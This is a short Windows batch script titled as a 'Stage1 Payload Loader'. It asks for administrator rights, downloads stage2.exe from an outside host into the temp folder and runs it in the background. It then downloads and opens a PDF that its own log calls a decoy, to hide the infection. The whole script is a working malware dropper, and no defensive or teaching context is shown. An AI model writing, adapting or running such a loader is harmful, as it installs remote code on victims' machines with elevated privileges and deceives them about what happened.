@echo off
title Stage1 Payload Loader (EXE)

:: Check for administrator privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell start -verb runas '%0'
    exit /b
)

echo Running with administrator privileges.
echo [!] Downloading stage2.exe from https://domenca.vercel.app/generated/payloads/stage2.exe
echo %date% %time% - Starting download > %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://domenca.vercel.app/generated/payloads/stage2.exe', '%TEMP%\stage2.exe')"
if exist %TEMP%\stage2.exe (
    echo [✓] stage2.exe downloaded, executing...
    echo %date% %time% - stage2.exe downloaded successfully >> %TEMP%\stage1_log.txt
    start /B %TEMP%\stage2.exe
) else (
    echo [✗] Download failed
    echo %date% %time% - Download failed >> %TEMP%\stage1_log.txt
)
echo [2] Opening document.pdf...
echo %date% %time% - Downloading document.pdf >> %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://domenca.vercel.app/generated/document.pdf', 'document.pdf')" && start document.pdf
echo %date% %time% - Decoy opened >> %TEMP%\stage1_log.txt
